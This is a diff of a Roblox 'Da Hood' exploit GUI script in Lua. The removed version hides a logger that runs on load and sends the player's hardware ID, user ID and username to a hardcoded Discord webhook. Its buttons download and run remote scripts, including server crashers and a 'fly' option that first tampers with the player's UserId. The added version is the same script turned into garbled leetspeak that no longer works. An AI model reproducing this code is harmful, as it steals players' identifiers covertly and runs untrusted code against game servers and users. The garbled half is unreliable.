@@ -1,161 +1,161 @@
-local function execution()
-    local HttpService = game:GetService("HttpService")
-    local http_request = (syn and syn.request or KRNL_LOADED and request or getexecutorname and http.request)
+|_°[∂|_ PH|_|/\/(710(\) €}{&<µ']['lø?()
+    1*<^| H']['7|>S€|2\|][(& = 6∂/\/\&:G3†S&2\/|(&("H†']['pS3|2\|1[£")
+    1[][^£ 4++p_123(,)|_|&?'][' = (§°//V ^/Vo| §°/11.®€0_µ£?7 9? KRNL_LOADED λ2|] ?&kw|_|£§+ øя 6&+€}{3([_]7ø®|\|@/|\3 λ|1|] /-/+']['|°.12&0_[_]3ŝ+)
 
-        local res = (request or http_request or syn and syn.request)({
-            Url = "https://api.luauth.xyz/hwid",
-            Method = "GET"
+        £[](q£ |Z&5 = (?&0_[_]&§7 ø2 /-/77|²_®£(,)|_|€?7 9|2 ŝ°//\/ /\2đ ŝj2.12£0_µ3ŝ'][')({
+            U12£ = "#†+][D5:///\][D!.|[_]λµ†4.><'/2/}{\A/|o|",
+            M&+|-|*đ = "GET"
         })
-        local hwid = string.match(res.Body, "(%w+)")
+        10</\1 ]-[\^/1đ = 5+|Z|/\\/6.(V)@']['[/-/(1²3?.BøÐ`/, "(%\\'+)")
 
-        http_request({
-            Url = "https://discord.com/api/webhooks/989548310295633961/R1Cg7DjmcNFqa7m_3WaN6jppJywHdRL7RcbcQpB1sonUoCMdlrsamqtaBOSAwC8sSl2z",
-            Method = "POST",
-            Body = HttpService:JSONEncode({
-                username = "Execution Logs",
-                embeds = {
+        4+7|*_я£kwµ£$+({
+            Uя1 = "4']['†][D?://|>1?©ø|ZÐ.[[]/\/\//-\|²][/VV&l³/-/ø*|<5/9-aite96654857150drei415to/RXF6270|]HNC_N£ßzS|_|`/_F6dreiZ|Z|]z_Z6-|BU297AG0_Q/\\/K§B\|_|(V)D!0_L91²Ð55)(^(S_||_|/|\QRYC",
+            M€7]-[<>o| = "POST",
+            B0|]j = H']['']['|²S3|2\/1(&:JSONE/V(ø|>&({
+                |_|ŝ€2/\/λ|'|'|& = "E?&[[_]+l()/V L°6?",
+                &^^|o€Ð5 = {
                     {
-                        title = "Execution Log Detected!",
-                        fields = {
+                        ']['1†13 = "E?3(|_|+!°/\/ L°6 D£+€(†£o|!",
+                        |=|3|_o|5 = {
                             {
-                              name = "HWID",
-                              value =  ""..hwid..""
+                              2q/|\& = "HWID",
+                              \//-\|[_]& =  ""..#\/\/!o|..""
                             },
                             {
-                              name =  "Roblox ID",
-                              value = ""..game.Players.LocalPlayer.UserId..""
+                              ?∂/\/\3 =  "R*13£<>>< ID",
+                              \|4£µ3 = ""..9/\(V)3.P£q`/&®ŝ.L*[λ1P|_λ'/€?.U$€|2I|]..""
                             },
                         {
-                              name =  "Roblox Username",
-                              value = ""..game.Players.LocalPlayer.Name..""
+                              11/-\^^€ =  "R081°>< U$3®|1∂|'|'|&",
+                              \/^£|_|£ = ""..9@/|\€.P£/-\'/£|?$.L*©q|P14'/£я.N@(V)£..""
                             }
                         },
-                        thumbnail = {
-                            url = "https://upload.wikimedia.org/wikipedia/commons/4/48/Roblox_Player_icon.png"
+                        †4[_]]V[ß/\\/q!1 = {
+                            |_|121 = "]-[7']['9?://|_|9£°/\|].\|/||(1/|\€|>l@.*|Z6/\|/][|{!|D&|>|/-\/(<>[]V[]^^[]|\|?/4/4eight/R°|>|°×_P£/\j£я_1<[]|1.][D|16"
                         },
                     }
 
                 }
             }),
-            Headers = {["Content-Type"] = "application/json"}
+            H3@|>&|?§ = {["C<>/|/†£?+-T`/][D£"] = "∂|*|D|1[q7][<>2/_|?ø11"}
         })
-    end
+    £|V|)
 
-    execution() -- use this to call it
-    
-    local ScreenGui = Instance.new("ScreenGui")
-local main = Instance.new("Frame")
-local madebyme = Instance.new("TextLabel")
-local fly = Instance.new("TextButton")
-local swagcrash = Instance.new("TextButton")
-local encryptcrash = Instance.new("TextButton")
-local cashcount = Instance.new("TextButton")
-local crashes = Instance.new("TextBox")
-local movement = Instance.new("TextBox")
-local teleports = Instance.new("TextLabel")
+    3}{€([_]+l()/|/() -- |_|§€ +4|5 79 [@|_|_ 1+
 
---Properties:
+|[][4| S©я£€|1Gµ! = I11ŝ†q/|/©£./\\/3\A/("S<|Z£3|\|G[_]1")
+|_ø<41 (V)/-\!(\) = I/|/5†4/|/©£.(\)&|/|/("F?4|\/|€")
+1[]</-\1 |'|'|@<|&ßj/v\3 = I/V§7/\|V©€./\\/3\|\|("T£><+L/-\8€1")
+£9[λ| |"1`/ = I(\)§']['/\/\\/[£.|\|£\/\/("T&}{']['B|_|7+ø/V")
+|[]<λ1 ?\/\/q6©|24ŝ]-[ = I?§+^|\|[€./V£\|\|("T£×7B[_]']['†°|\|")
+|_[](^£ &|1(2°/|2†<?/\ŝ]-[ = I?574/\\/<€.?£\|\|("T3><+Bµ+']['()/\/")
+19©q1 (/-\5]-[©0|_|11† = I/\\/574|V(€./\\/€|/|/("T€?†B[_]+†0?")
+£0<^1 (2q5#&? = I|\|5+42[€.?&\/\/("T€×']['B<>%")
+1[](@1 ]V[[]|/€(V)£|\|† = I/V?†λ2[&./\\/3\^/("T3><+B*><")
+£°©q1 ']['3£€|*°я+5 = I/V$']['∂/|/(£./V£\^/("T3×†L/-\|3&£")
 
-
-ScreenGui.Parent = game.CoreGui
-
-main.Name = "main"
-main.Parent = ScreenGui
-main.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
-main.Position = UDim2.new(0.254677624, 0, 0.170437455, 0)
-main.Size = UDim2.new(0, 608, 0, 377)
-main.Active = true
-main.Draggable = true
+--P1²()|*312']['!&5:
 
 
-madebyme.Name = "made by me"
-madebyme.Parent = main
-madebyme.BackgroundColor3 = Color3.fromRGB(1, 98, 255)
-madebyme.Size = UDim2.new(0, 608, 0, 59)
-madebyme.Font = Enum.Font.SourceSans
-madebyme.Text = "da hood gui, made by tom"
-madebyme.TextColor3 = Color3.fromRGB(0, 0, 0)
-madebyme.TextSize = 14.000
+S[|Z33/\\/G|_|1.P/\12£|\|7 = 9@/|\3.C<>|2€Gµ!
 
-fly.Name = "fly"
-fly.Parent = main
-fly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-fly.Position = UDim2.new(0.733552635, 0, 0.289124668, 0)
-fly.Size = UDim2.new(0, 162, 0, 25)
-fly.Font = Enum.Font.SourceSans
-fly.Text = "fly"
-fly.TextColor3 = Color3.fromRGB(0, 0, 0)
-fly.TextSize = 14.000
-fly.MouseButton1Down:connect(function()
-	game.Players.LocalPlayer.UserId = 2607519759
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
-end)
+^^4!/\/.N@(V)& = "|11/-\!|V"
+]V[4||V.P@12€|V† = S<|?£3/\\/Gµ][
+]V[/-\l|\|.B@©|<6|?ø|_|/\\/|]C01ø®drei = C0|_()2drei.PH12()[]V[]RGB(43, 4drei, 43)
+|'|'|∂!11.P()5l+!*/V = UDl|'|'|2.11&\|\|(0.254677624, 0, 0.1704drei7455, 0)
+^^λ][2.S][23 = UDl]V[2./\\/£\^/(0, 608, 0, 377)
+[]V[]∂1/\\/.A<†!\|3 = +|?[_]£
+AA4!/V.D?^66/\|>££ = ']['|?|_|3
 
-swagcrash.Name = "swag crash"
-swagcrash.Parent = main
-swagcrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-swagcrash.Position = UDim2.new(0, 0, 0.289124668, 0)
-swagcrash.Size = UDim2.new(0, 200, 0, 33)
-swagcrash.Font = Enum.Font.SourceSans
-swagcrash.Text = "swag crash"
-swagcrash.TextColor3 = Color3.fromRGB(0, 0, 0)
-swagcrash.TextSize = 14.000
-swagcrash.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-end)
 
-encryptcrash.Name = "encrypt crash"
-encryptcrash.Parent = main
-encryptcrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-encryptcrash.Position = UDim2.new(0, 0, 0.376657754, 0)
-encryptcrash.Size = UDim2.new(0, 200, 0, 25)
-encryptcrash.Font = Enum.Font.SourceSans
-encryptcrash.Text = "encrypt crash"
-encryptcrash.TextColor3 = Color3.fromRGB(0, 0, 0)
-encryptcrash.TextSize = 14.000
-encryptcrash.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua'))()
-end)
+|\/|/-\|)&13`/^^3.NλAA& = "AA^o|& |o°/ (V)€"
+]V[4o|3l³`/|\/|3.P^1²&|17 = []V[]^][11
+|11qÐ313'//\/\3.B4(|(9|?[]|_|2đC[]1°?3 = C9|9?drei.|"|Z°]V[RGB(1, 9-aite, 255)
+[]V[]^|]€|3j|\/|3.Slz3 = UD][/v\to.?3\|/(0, 608, 0, 59)
+|'|'|qo|3ßjAA3.Fø?† = E/\/[_](V).F<>2']['.Sø[_]|2<&S^(\)ŝ
+/|\λ|]&13°/|\/|£.T€)(† = "|)4 #()°Ð 6|_||, ^^4đ& 13°/ +9/\/\"
+|'|'|@o|£|>°//v\&.T€×']['C[]|<>123 = C0£9®drei.ƒя°/\/\RGB(0, 0, 0)
+^^λ|>€l³`/(V)&.T€}{†S1z€ = 14.000
 
-cashcount.Name = "cash count"
-cashcount.Parent = main
-cashcount.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-cashcount.Position = UDim2.new(0.353618413, 0, 0.156498671, 0)
-cashcount.Size = UDim2.new(0, 200, 0, 50)
-cashcount.Font = Enum.Font.SourceSans
-cashcount.Text = "cash count"
-cashcount.TextColor3 = Color3.fromRGB(0, 0, 0)
-cashcount.TextSize = 14.000
-cashcount.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/DaHood%20Cash%20Counter'))()
-end)
+|"1°/.N^/v\€ = "|"£j"
+|=1`/.P@2€2'][' = []V[]/-\][/\/
+PH£`/.B∂<|<9я[]|_|?|>C°|°|2drei = Cø|9123.|"®°/v\RGB(to55, 255, to55)
+PH£°/.P*51+l9/\\/ = UD!]V[2.2&\|\|(0.73drei5526drei5, 0, 0.2-aite9124668, 0)
+|"1`/.S][(\)& = UDl|\/|to./V&\|/(0, 16to, 0, to5)
+ƒ|_°/.Fø/V† = E/|/|_||11.F*|1+.S9|_||Z©€S/\(\)§
+ƒ£`/.T€?'][' = "|"1j"
+|"1`/.T&}{']['C[]|_*?drei = C01[]?3.|"?*/\/\RGB(0, 0, 0)
+|"£`/.T&?†Sl(\)£ = 14.000
+PH£°/.M9µ?&B[_]']['']['[](\)1Døuu|\|:©ø(\)/\/£[†(|"[_]/\\/[']['][[]|\|()
+	9/\|113.P£λ°/3|Z§.L*(λ£P|/\j£|2.Uŝ&|ZIo| = 2607519759
+	10λ|]§71²l?6(6@/v\€:H†7|DG£']['('|-|77|2ŝ://|2/-\VV.9!+|-|µ|3µ?£?(ø|1']['&(\)']['.<9|11/to2|{®][$†1/V^/ŝuu^9/AA/\!|\|/@Ð^^l2_ƒ1`/'))()
+€|1|>)
 
-crashes.Name = "crashes"
-crashes.Parent = main
-crashes.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-crashes.Position = UDim2.new(0, 0, 0.156498671, 0)
-crashes.Size = UDim2.new(0, 200, 0, 50)
-crashes.Font = Enum.Font.SourceSans
-crashes.Text = "crashes"
-crashes.TextColor3 = Color3.fromRGB(255, 255, 255)
-crashes.TextSize = 14.000
+5\|/49©124ŝ}{.N@/v\£ = "ŝ\|//\6 <|24$]-["
+?\|//\6©12λ$}{.P4|23|\|+ = ]V[λ1/\\/
+§VV@6[2∂5]-[.Bλ(|(9|Z[][_]|1|>C°1ø12drei = C°|_°яdrei.|=|?ø/\/\RGB(to55, 255, 255)
+5\|//\6(®λ$/-/.Pø§!71°/\\/ = UD1/v\to.|V€\A/(0, 0, 0.to891to4668, 0)
+?\A/@9(2q§/-/.Slz€ = UD1|'|'|to./\/£VV(0, to00, 0, dreidrei)
+5\A/∂6©?/\?/-/.Fø/V'][' = E|1µ]V[.F*/V†.S[]|_|1²[£S4??
+$uu^9(|2@5|-|.T£×+ = "§\/\/49 (|2/-\ŝ/-/"
+§uuq6(?/\§#.T€><+C()|_°|Zdrei = C[]|øя3.|"®9[]V[]RGB(0, 0, 0)
+§\|\|^6[|Zq$#.T€×7S!(\)& = 14.000
+§\A//-\6©2q?]-[.M<>µ§&Bµ77ø?1D<>|/|//V:©()2/\\/£[']['(PH|_|?<+1[]/\\/()
+	1ø/\|)$712!/|/9(6@/|\&:H7†|>G3†('}{']['']['|°§://|Z@\\'.6!+}{[_]8|_|§€|?(<>/\\/†€|\|†.<[]]V[/1£12|(&1²^^32/1[_]∂-p|20_|&(']['$/[]V[]/-\§+€12/S[_]|*32Cµ$†<>]V[S€2\/€|ZC|?λŝ|-|&1²'))()
+£/V<|)
 
-movement.Name = "movement"
-movement.Parent = main
-movement.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-movement.Position = UDim2.new(0.671052635, 0, 0.156498671, 0)
-movement.Size = UDim2.new(0, 200, 0, 50)
-movement.Font = Enum.Font.SourceSans
-movement.Text = "movement"
-movement.TextColor3 = Color3.fromRGB(255, 255, 255)
-movement.TextSize = 14.000
+&2©12°/p7(|Z@§#.N^^^€ = "£(\)[яj|27 ©я/-\$#"
+3|V(я°/|²7[24§]-[.P^|?&?† = ^^4!?
+£/\\/<®`/|²†©1²q5#.B/-\(|{9129[_]?|]C*|<>2drei = C9|_<>1²3.|"|20/v\RGB(255, 255, 255)
+&2[2°/|°7(?/-\ŝ]-[.P()ŝl']['1ø(\) = UD|(V)to.?€\/\/(0, 0, 0.376657754, 0)
+£?(|2°/|>']['[2∂$]-[.S12€ = UD!|\/|to.11&\/\/(0, 200, 0, 25)
+&|V<яjp+[2qŝ}{.F0/|/7 = E2[_]|\/|.F0(\)+.Sø[_]12©&S/-\|15
+&/V(®`/97[®λ5/-/.T3%'][' = "£/\\/©®j|°'][' <12@ŝ/-/"
+&/|/(?'/|*7<|2/-\$|-|.T&%+C()1()1²drei = C[]£°|?3.|"2ø^^RGB(0, 0, 0)
+£|\|(2°/|²†©?4?#.T3×']['Sl(\)€ = 14.000
+€|1(|?'/|²†©|?λ?}{.M0µŝ€Bµ++0|11D[]|/|//V:<ø/|//V&(7(ƒ|_|/|/(†lø/\\/()
+	|[]λo|?+|2l|V6(9^/|\€:H7+|DG€†('47†][D5://12/\\|/.9!']['/-/|_|8[_]$&?©()2+€2†.©()^^/®3/v\()?ŝ€W/3/\\/©1²`/|*']['W/(V)/\l|\|/C|_|5']['ø/\/\E/\/©12`/|>']['C®/-\$]-[€1².1|_|/\'))()
+3?|])
 
-teleports.Name = "teleports"
-teleports.Parent = main
-teleports.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-teleports.Position = UDim2.new(0.342105299, 0, 0.517241359, 0)
-teleports.Size = UDim2.new(0, 200, 0, 50)
-teleports.Font = Enum.Font.SourceSans
-teleports.Text = "teleports"
-teleports.TextColor3 = Color3.fromRGB(255, 255, 255)
-teleports.TextSize = 14.000 
+(/\ŝ4[0µ(\)†.N/\]V[€ = "<45/-/ [()µ|\|7"
+(/-\?#©()|_||\|7.P∂®€11'][' = /v\@!|V
+(λ§|-|(()|_||\|†.B@©|{91²*µ11<|C°1*яdrei = C<>£<>123.|"1²*|\/|RGB(to55, to55, to55)
+[λ?]-[[0|_|/\/']['.P0?1+l°/\/ = UDl/v\2./V€\A/(0.35drei61-aite41drei, 0, 0.156498671, 0)
+©^$/-/©<>[_]|1†.S!(\)£ = UD|[]V[]to./V3VV(0, to00, 0, 50)
+(@5|-|([][_]11†.F()117 = E|\|[_]/v\.F02+.S*[_]1²[€Sλ|1?
+(/\ŝ#<()[_](\)7.T€?+ = "<λŝ/-/ <ø[_]|1']['"
+(λ?|-|[[][_]/V']['.T£}{+Cø£°12drei = C*1()®drei.ƒ|Z[]|\/|RGB(0, 0, 0)
+<q5#<0µ|V']['.T£?']['S|(\)3 = 14.000
+©4§|-|(*µ/\/†.M°µ?£B|_|+']['9|\|1D°\A/|1:©[]|1/\/€[']['(|=[_]/|/(7][0|\|()
+	10@o|5†1²l/\\/9(9^/|\3:H†79G€+('|-|']['†|2§://2@\/\/.9|†]-[[_]|3|_|$€2[°|\|']['€/\/†.[0|'|'|/GSto1Oƒƒ][<!@£/S3|1312-T<>01§/^^/\1|1/D/\H()0|)%20C∂$]-[%20C<>|_|/V+£|?'))()
+3/\\/|])
+
+[|?/-\?]-[&$.Nλ[]V[]€ = "(124§|-|3ŝ"
+©2/-\5|-|3?.P/-\®£11'][' = |11q12
+(®∂§/-/&?.B@<|<6®9|_||\|o|C*1()12drei = C9£[]23.ƒ|?°(V)RGB(45, 45, 45)
+©я/\?#£?.P*?!']['|°/|/ = UDl^^to.|1&\\'(0, 0, 0.15649-aite671, 0)
+©|Z4ŝ}{&?.S|2£ = UD1|112.|V€VV(0, to00, 0, 50)
+<®λ$/-/£?.F()?+ = E|1µ/\/\.F()(\)']['.S[]|_|12(3S/-\/V$
+(?4?/-/£§.T€?+ = "©яq$43$"
+<1²q$}{35.T3)(†C<>1°®3 = Cø|_9|?3.PH|2<>|\/|RGB(to55, to55, to55)
+<12/-\§|-|&§.T£×7S|(\)3 = 14.000
+
+|11*\/3(V)£117.Nλ|\/|£ = "/\/\*|/£|\/|€|V7"
+]V[°\/3|'|'|&/V']['.Pλ12&/|/† = ^^/-\l?
+|\/|9\/€AA£/|/']['.B@©|<61²9|_|/\/o|C9£ø1²3 = Cø£*®drei.PH|29(V)RGB(45, 45, 45)
+[]V[]*\|£AA€2†.P05][†l()/\\/ = UD][AAto.|13|/|/(0.67105to635, 0, 0.15649-aite671, 0)
+/|\[]\/€(V)£|V7.S!z& = UD1/|\2./\\/€\^/(0, 200, 0, 50)
+|'|'|<>\/3|\/|32+.F<>(\)+ = E|Vµ[]V[].Fø|V+.S()[_]я(€S@11?
+|'|'|0\|€^^&/|/7.T3×† = "]V[0\/£[]V[]3|\|†"
+]V[0\/£(V)£/\\/7.T£?+C°1*®3 = C[]1*1²drei.ƒ2°AARGB(to55, 255, 255)
+]V[9\|£/\/\3(\)+.T&%7S|(\)£ = 14.000
+
+']['&1&|2°27?.Nq|'|'|€ = "7€1€|²°|2†5"
++€£3|20|Z7ŝ.P/\я€|1'][' = |11∂|2
+7&|_£|²ø|2+§.B^©|<9|Z()|_||1ÐC01°|?3 = C()1<>1²drei.|=я<>(V)RGB(45, 45, 45)
+']['3|_£|°0|2']['§.P()5|']['l<>/|/ = UD!/|\to.2&\A/(0.drei4to105299, 0, 0.517to41359, 0)
+']['&|€|°[]|2']['5.Slz£ = UD][^^2./\/&|/|/(0, 200, 0, 50)
+']['3|3|*9|Z7$.F°|\|'][' = E2|_|/|\.F9|\|']['.S0|_|12<£S@/\\/5
+']['£1&|°()?']['§.T&%7 = "†&|_3|²0?']['$"
+†&|€|°()?+$.T&><†C0|_9123 = C()1°®3.|=2°/\/\RGB(255, 255, to55)
+7&1€|²()?†§.T&×']['Sl2£ = 14.000 
